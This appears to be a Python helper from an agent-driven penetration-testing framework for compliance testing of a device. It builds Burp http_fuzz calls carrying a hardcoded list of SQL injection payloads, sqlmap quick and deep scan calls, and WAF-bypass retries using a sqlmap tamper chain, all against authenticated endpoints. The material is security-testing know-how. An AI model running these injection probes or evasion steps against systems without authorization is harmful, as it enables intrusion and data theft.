#!/usr/bin/env python3
"""
SQL 注入探针 (条款 5.13-1) — 从 sqlmap_targets manifest 生成 http_fuzz 探针与 sqlmap 三工具桥调用。

纯确定性脚本：消费 `mcp__burp__sqlmap_targets` 输出的 manifest（扩展内已做 过滤→去重→参数分级→
动态预检，每端点带已注入认证头的 request 原文），只取 priority=HIGH（含 dynamic 预检提升）的端点，
写入 sqlmap -r 请求文件，并生成 http_fuzz 探针 + sqlmap_bridge_run / sqlmap_batch_run /
sqlmap_bypass_retry 桥调用（quick/deep/绕过）。
不自持 MCP 连接 —— 输出 mcp_calls / bridge_calls / batch_calls / bypass_calls 供 agent 执行。

sqlmap 执行与 evidence 回收全部交给桥工具族（扩展内嵌 sqlmap4burp++ 启动逻辑：读 manifest 取 request
→ 写 .req → 同步跑 sqlmap → 解析 --output-dir 日志 → confirmed/clean/suspect/blocked 四态）。
三工具均内置认证刷新 (auth_refresh=true: 401/403 信号 → proxy_latest_auth 重取头 → 重写 .req → 重跑)。
本脚本不再直连 sqlmap CLI。

流程 (按 web-sqli.md):
  0. proxy_latest_auth 拿认证头 → sqlmap_targets 拿 manifest
  1. 本脚本消费 manifest: 只取 priority=HIGH 的端点（含 dynamic 预检提升）
  2. 写 sqlmap -r 请求文件（manifest.request 已注入新认证头）
  3. http_fuzz 对参数位置放 SQLi 探针 (确认注入点)
  4. 批量主流程 → batch_calls: sqlmap_batch_run mode=quick escalate=true (quick→deep 自动升级+限速)
  5. 单端点精扫 → bridge_calls: sqlmap_bridge_run mode=quick (Repeater 复核前逐点确认)
  6. blocked/suspect → bypass_calls: sqlmap_bypass_retry (tamper 链迭代, block_ledger.jsonl 留痕)
  7. repeater_send 送 Repeater 供人工复核

用法:
  python sqli_probe.py <workspace> --target=IP --endpoints=sqlmap_manifest.json [--prefix=https]

输入 (sqlmap_manifest.json): sqlmap_targets 输出，endpoints[] 每项含 seq/url/method/path/priority/dynamic/params/request
输出 (JSON):
  {"status":"ok", "candidates":[{"seq","url","method","params",...}],
   "mcp_calls":[{"action":"mcp__burp__http_fuzz","params":{...}}],
   "bridge_calls":[{"action":"mcp__burp__sqlmap_bridge_run","params":{"workspace","endpoint_id","mode"},...}],
   "batch_calls":[{"action":"mcp__burp__sqlmap_batch_run","params":{"workspace","endpoint_ids","mode","escalate","batch_delay_ms"},...}],
   "bypass_calls":[{"action":"mcp__burp__sqlmap_bypass_retry","params":{"workspace","endpoint_id","mode","max_attempts"},...}],
   "next":"..."}
"""

from __future__ import annotations  # Python 3.8 兼容：list[dict] 注解延迟求值

import json
import os
import re
import sys
from urllib.parse import urlparse, parse_qs

# Windows 控制台重定向时默认按 GBK 写 stdout → JSON 被污染。强制 UTF-8。
try:
    sys.stdout.reconfigure(encoding="utf-8")
except AttributeError:  # Python < 3.7
    pass

# 标准 SQLi 探针 payload (快速确认注入点)
SQLI_PAYLOADS = [
    "'", '"', "')", '")',
    "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'#",
    "1 OR 1=1", "1 OR 1=1--",
    "' AND '1'='1", "' AND '1'='2",
    "1 AND 1=1", "1 AND 1=2",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "1) OR (1=1)--", "'; SELECT SLEEP(5)--",
]


def load_endpoints(path: str) -> list[dict]:
    if not os.path.exists(path):
        print(json.dumps({"status": "error", "error": f"文件不存在: {path}"}, ensure_ascii=False))
        sys.exit(1)
    with open(path, "r", encoding="utf-8") as f:
        data = json.load(f)
    if isinstance(data, dict):
        for key in ("endpoints", "results", "items", "candidates"):
            if isinstance(data.get(key), list):
                return data[key]
        # auth_orchestrator endpoints 输出也有 "endpoints" 键，已覆盖
        return []
    if isinstance(data, list):
        return data
    return []


def extract_params(url: str) -> list[str]:
    """从 URL 提取 query 参数名 (去重)。"""
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    return list(qs.keys())


def find_candidates(endpoints: list[dict]) -> list[dict]:
    """从 sqlmap_targets manifest 筛出待扫端点：priority=HIGH（含 dynamic 预检提升）。"""
    candidates = []
    seen = set()
    for ep in endpoints:
        if not isinstance(ep, dict):
            continue
        method = (ep.get("method") or "GET").upper()
        url = ep.get("url") or ep.get("full_url") or ep.get("path") or ""
        if not url:
            continue
        if (ep.get("priority") or "SKIP").upper() != "HIGH":
            continue
        key = f"{method}:{url}"
        if key in seen:
            continue
        seen.add(key)
        params = ep.get("params") or []
        # URL query 参数名（BODY 参数由 sqlmap 从请求 body 自动发现）
        url_params = [
            p.get("name") for p in params
            if isinstance(p, dict) and (p.get("type") or "").upper() != "BODY" and p.get("name")
        ]
        candidates.append({
            "seq": ep.get("seq"),  # manifest endpoints[].seq → sqlmap_bridge_run endpoint_id
            "method": method,
            "url": url,
            "path": ep.get("path") or urlparse(url).path or "/",
            "params": url_params,
            "has_body": bool(ep.get("has_body")),
            "request": ep.get("request") or "",
            "dynamic": ep.get("dynamic"),
        })
    return candidates


def build_fuzz_call(target: str, candidate: dict, prefix: str) -> dict:
    """对单个候选端点构造 http_fuzz SQLi 探针调用（基于 manifest 的 request 原文，已带认证头）。"""
    method = candidate["method"]
    url = candidate["url"]
    host = target
    request = candidate.get("request") or ""
    first_param = candidate["params"][0] if candidate.get("params") else None

    # 只对带 URL query 参数的 GET 端点做 FUZZ 替换；纯 body 端点仅生成 sqlmap 命令
    if method == "GET" and first_param and request:
        # 在 request 原文里把第一个 param=value 替换为 FUZZ
        pat = re.compile(rf"({re.escape(first_param)}=)[^&\r\n ]*")
        fuzz_request = pat.sub(rf"\g<1>FUZZ", request, count=1)
        if fuzz_request == request:
            return None
        return {
            "action": "mcp__burp__http_fuzz",
            "params": {
                "request": fuzz_request,
                "host": host,
                "port": 443 if prefix == "https" else 80,
                "use_tls": prefix == "https",
                "payloads": SQLI_PAYLOADS,
            },
            "note": f"对 {url} 的参数 {first_param} 放 SQLi 探针（基于 manifest request 原文），观察响应差异 (报错/布尔/时延)",
        }
    return None


def write_request_file(workspace: str, candidate: dict) -> str:
    """把 manifest.request 原文写入 sqlmap -r 请求文件（认证头已内嵌）。"""
    req_dir = os.path.join(workspace, "sqlmap")
    os.makedirs(req_dir, exist_ok=True)
    name = re.sub(r"[^A-Za-z0-9]+", "_", f"{candidate['method']}_{candidate.get('path', '')}").strip("_") or "endpoint"
    fpath = os.path.join(req_dir, f"{name}.req")
    with open(fpath, "w", encoding="utf-8") as f:
        f.write(candidate.get("request") or "")
    return fpath


def build_bridge_calls(workspace: str, candidate: dict) -> list[dict]:
    """生成 sqlmap_bridge_run 单端点桥调用（替代直连 sqlmap CLI）。

    桥工具在扩展内复刻 sqlmap4burp++ 启动逻辑：读 manifest 取 request（认证头已内嵌）
    → 写 .req → 同步跑 sqlmap → 解析 --output-dir 日志 → confirmed/clean/suspect/blocked 四态。
    auth_refresh=true（默认）→ 401/403 信号自动重取认证头重跑，无需手工预检。
    sqlmap 路径/参数均可在调用里覆盖（python / sqlmap_path / extra_options / timeout_seconds）。
    """
    write_request_file(workspace, candidate)  # 保留 .req 工件，供 http_fuzz / Repeater 复核
    seq = candidate.get("seq")
    calls = []
    quick_params = {"workspace": os.path.abspath(workspace), "endpoint_id": str(seq), "mode": "quick"}
    calls.append({
        "action": "mcp__burp__sqlmap_bridge_run",
        "params": quick_params,
        "note": f"快速扫描 {candidate['url']}（level=1/risk=1/smart）：确认是否真注入点。返回 triage:confirmed → 继续 deep；clean → 记录排除依据；suspect/blocked → 执行 bypass_calls 对应项",
    })
    deep_params = {"workspace": os.path.abspath(workspace), "endpoint_id": str(seq), "mode": "deep"}
    calls.append({
        "action": "mcp__burp__sqlmap_bridge_run",
        "params": deep_params,
        "note": f"深度扫描 {candidate['url']}（仅 quick 命中后执行，level=3/risk=2/tamper）：确认后 extracted 的 injected_parameter + payload 即 PoC 证据，进 evidence_M5",
    })
    return calls


def build_batch_call(workspace: str, candidates: list[dict], mode: str = "quick") -> dict:
    """生成 sqlmap_batch_run 批量桥调用：所有 HIGH 端点一批全跑 + quick→deep 自动升级 + 限速。

    批量模式下 escalate=true：每端点 quick → found/blocked 自动 deep 深扫；batch_delay_ms 限速
    防 403。返回 summary{confirmed,clean,suspect,blocked} 四态汇总，每任务含 quick/deep 子结果。
    """
    seqs = [str(c.get("seq")) for c in candidates if c.get("seq") is not None]
    return {
        "action": "mcp__burp__sqlmap_batch_run",
        "params": {
            "workspace": os.path.abspath(workspace),
            "endpoint_ids": ",".join(seqs),
            "mode": mode,
            "escalate": True,
            "batch_delay_ms": 250,
        },
        "note": f"批量扫描 {len(seqs)} 个 HIGH 端点（mode=quick, escalate=true: 命中→自动 deep）→ summary{{confirmed,clean,suspect,blocked}}；单端点证据取 tasks[].quick/deep 的 injected_parameter + payload 进 evidence_M5",
    }


def build_bypass_call(workspace: str, candidate: dict, mode: str = "quick", max_attempts: int = 3) -> dict:
    """生成 sqlmap_bypass_retry 桥调用：单端点 WAF/时间盲注疑似被拦时沿 tamper 链迭代绕过。

    仅当批量/单端点 quick 返回 triage:suspect 或 status:blocked 时执行。attempt 0 用原 options，
    之后按 tamper 链 (space2comment→between→charencode→randomcase→hex→percentage) 逐次追加 --tamper，
    每次尝试追加 sqlmap/block_ledger.jsonl（审计留痕）。found/clean 即 decisive 停止。
    """
    seq = candidate.get("seq")
    return {
        "action": "mcp__burp__sqlmap_bypass_retry",
        "params": {
            "workspace": os.path.abspath(workspace),
            "endpoint_id": str(seq),
            "mode": mode,
            "max_attempts": max_attempts,
        },
        "note": f"WAF 绕过 {candidate['url']}（仅 quick 判 suspect/blocked 后执行）：tamper 链迭代，每次尝试追加 sqlmap/block_ledger.jsonl；仍 blocked → 转 Burp Repeater 人工复核",
    }


def main():
    ws = ""
    target = ""
    endpoints_path = ""
    cookie = None
    prefix = "http"

    for a in sys.argv[1:]:
        if a.startswith("--target="):
            target = a.split("=", 1)[1]
        elif a.startswith("--endpoints="):
            endpoints_path = a.split("=", 1)[1]
        elif a.startswith("--cookie="):
            cookie = a.split("=", 1)[1]
        elif a.startswith("--prefix="):
            prefix = a.split("=", 1)[1]
        elif not a.startswith("--"):
            ws = a

    if not ws or not target or not endpoints_path:
        print("用法: python sqli_probe.py <workspace> --target=IP --endpoints=sqlmap_manifest.json [--prefix=https]", file=sys.stderr)
        sys.exit(2)

    endpoints = load_endpoints(endpoints_path)
    candidates = find_candidates(endpoints)

    if not candidates:
        print(json.dumps({
            "status": "ok",
            "candidates": [],
            "mcp_calls": [],
            "bridge_calls": [],
            "batch_calls": [],
            "bypass_calls": [],
            "summary": {"note": "manifest 中无 priority=HIGH 端点（含 dynamic 预检提升），SQLi 面为空"},
        }, indent=2, ensure_ascii=False))
        sys.exit(0)

    mcp_calls = []
    bridge_calls = []
    for c in candidates:
        fc = build_fuzz_call(target, c, prefix)
        if fc:
            mcp_calls.append(fc)
        bridge_calls.extend(build_bridge_calls(ws, c))
    batch_calls = [build_batch_call(ws, candidates)]
    bypass_calls = [build_bypass_call(ws, c) for c in candidates]

    # 前置: 拿最新有效认证头 (sqlmap/http_fuzz 需认证，跳过验活会 401)。
    # proxy_latest_auth 是全框架唯一公共凭证源（替代 session_ensure 两步法 / cookie jar）。
    prereq = {
        "step": 0,
        "command": f"mcp__burp__proxy_latest_auth{{host:{target}}}",
        "note": "前置: 一步拿最新有效认证头（扩展内真频率分析选帧 + 同帧提取 Cookie/SessionTag/Authorization + 启发式认证头 + live GET 验证）。status:ok + verify.valid:true → 取 tokens.cookie / session_tag 注入 sqlmap -r 请求文件与 http_fuzz 请求；expired/no_auth/no_traffic → 提示用户经 Burp 代理刷新 DUT 页面后重调。凭据刷新不计入 retry。",
    }

    result = {
        "status": "ok",
        "prereq": prereq,
        "candidates": candidates,
        "candidate_count": len(candidates),
        "mcp_calls": mcp_calls,
        "bridge_calls": bridge_calls,
        "batch_calls": batch_calls,
        "bypass_calls": bypass_calls,
        "summary": {
            "clause": "5.13-1",
            "payload_count": len(SQLI_PAYLOADS),
            "next": "0) 先跑 prereq.proxy_latest_auth 拿认证头（sqlmap 三工具也内置 auth_refresh，此为 http_fuzz 预检）→ 1) 执行 mcp_calls 里的 http_fuzz 探针（请求带认证头）→ 2) 批量主流程执行 batch_calls[0] sqlmap_batch_run（mode=quick, escalate=true, 全 HIGH 端点 + quick→deep 自动升级 + 限速，summary 四态汇总）→ 3) Repeater 复核前对重点端点执行 bridge_calls 逐点精扫（mode=quick, 命中再 deep）→ 4) 批量/单端点判 suspect/blocked 的端点执行对应 bypass_calls sqlmap_bypass_retry（tamper 链迭代, block_ledger.jsonl 留痕）→ 5) 确认的 injected_parameter + payload 取自 sqlmap 日志写进 evidence_M5 → 6) repeater_send 人工复核",
        },
    }
    print(json.dumps(result, indent=2, ensure_ascii=False))
    sys.exit(0)


if __name__ == "__main__":
    main()
